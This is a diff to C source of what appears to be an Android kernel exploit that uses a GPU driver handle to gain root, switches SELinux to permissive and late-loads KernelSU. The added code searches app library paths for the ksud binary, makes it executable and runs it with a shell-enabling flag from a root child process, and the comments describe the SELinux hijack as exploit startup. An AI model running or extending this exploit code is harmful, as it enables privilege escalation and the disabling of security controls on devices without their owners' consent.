@@ -8,6 +8,7 @@
 #define _GNU_SOURCE
 #include <errno.h>
 #include <fcntl.h>
+#include <glob.h>
 #include <pthread.h>
 #include <sched.h>
 #include <signal.h>
@@ -920,6 +921,34 @@ static int load_module_file(const char *path) {
     return ksu_load_module(path, params);
 }
 
+/*
+ * The manager does not always have /data/adb/ksud installed on a fresh
+ * boot; fall back to the symlink and then the APK's native libksud.so,
+ * the way DFRoot stages the manager's own binary.
+ */
+static const char *resolve_ksud(const char *pkg, char *buf, size_t bufsz) {
+    static const char *cands[] = {
+        "/data/adb/ksud", "/data/adb/ksu/bin/ksud", NULL
+    };
+    for (int i = 0; cands[i]; i++)
+        if (access(cands[i], X_OK) == 0)
+            return cands[i];
+
+    char pattern[256];
+    snprintf(pattern, sizeof pattern,
+             "/data/app/*/%s*/lib/arm64/libksud.so", pkg);
+    glob_t g;
+    if (glob(pattern, 0, NULL, &g) == 0) {
+        if (g.gl_pathc > 0) {
+            snprintf(buf, bufsz, "%s", g.gl_pathv[0]);
+            globfree(&g);
+            return buf;
+        }
+        globfree(&g);
+    }
+    return NULL;
+}
+
 static void setenforce_permissive(void);
 static void run_policy_fix(void);
 
@@ -1284,19 +1313,34 @@ static void child_loop(int idx, pid_t parent_pid, int kgsl_fd) {
     }
 
     /*
-     * A late-loaded module has no init-started ksud, so the manager app's
-     * ksud children have no driver fd and their SYS_reboot magic is killed
-     * by the app seccomp policy.  ksud's own late-load entry point sets the
-     * userspace up and restarts the manager with a fresh fd; run it from
-     * this full-capability root child.
+     * Permissive is only needed for the exploit startup (init_module is
+     * denied by the current SELinux domain while enforcing, and the raw
+     * store lets the child run as root).  KernelSU's LKM init re-enables
+     * enforcing by design; leave that decision to KernelSU instead of
+     * fighting it with a second selinuxfs write.
      */
+
+    /*
+     * A late-loaded module has no init-started ksud, so the manager app's
+     * ksud children have no driver fd.  Run the userspace's own late-load
+     * entry point from this full-capability root child.
+     */
+    const char *pkg = getenv("KSU_PACKAGE");
+    if (!pkg || !*pkg)
+        pkg = "me.weishu.kernelsu";
     const char *late = getenv("LATE_LOAD");
+    int late_disabled = late && (!strcmp(late, "0") || !strcmp(late, "off"));
+    char latebuf[256];
+    if (!late_disabled && (!late || !*late || access(late, X_OK) != 0)) {
+        const char *resolved = resolve_ksud(pkg, latebuf, sizeof latebuf);
+        if (resolved)
+            late = resolved;
+    }
     if (!late)
         late = "/data/adb/ksud";
-    if (*late && strcmp(late, "0") && strcmp(late, "off")) {
-        const char *pkg = getenv("KSU_PACKAGE");
-        if (!pkg || !*pkg)
-            pkg = "me.weishu.kernelsu";
+    int late_enabled = !late_disabled && *late;
+    if (late_enabled) {
+        (void)chmod(late, 0755);
         printf("[*] %s late-load --allow-shell --package-name %s\n", late, pkg);
         pid_t lp = fork();
         if (lp == 0) {
@@ -1304,6 +1348,7 @@ static void child_loop(int idx, pid_t parent_pid, int kgsl_fd) {
                              (char *)"--allow-shell",
                              (char *)"--package-name", (char *)pkg, NULL };
             execv(late, argv);
+            perror("execv late-load");
             _exit(127);
         }
         if (lp > 0) {
@@ -1314,9 +1359,14 @@ static void child_loop(int idx, pid_t parent_pid, int kgsl_fd) {
         }
     }
 
-    /* Load KSU before the slow policy reload so the manager can detect it
-     * immediately; the script itself is backgrounded. */
-    run_policy_fix();
+    /*
+     * Let KernelSU load its own sepolicy; running policy_fix.sh at the same
+     * time makes two security_load_policy() calls hold the SELinux policy
+     * rwlock long enough to trip the watchdog (console-ramoops-0).  Use
+     * POLICY_FIX=1 to force the old behaviour without a late-load.
+     */
+    if (!late_enabled || env_flag("POLICY_FIX", 0))
+        run_policy_fix();
 
     _exit(0);
 }
@@ -2266,7 +2316,8 @@ static void sec_report_permissive(uint64_t kaslr, pid_t pid) {
            (unsigned long long)kaslr, state, enforce);
     if (!kaslr) return;
     if (enforce == 0)
-        printf("[+] SELinux is now permissive for this boot\n");
+        printf("[+] SELinux is permissive for the exploit startup"
+               " (KernelSU may re-enable enforcing)\n");
     else
         fprintf(stderr, "[-] hijack ran but selinux_state.enforcing still"
                         " reads %d\n", enforce);
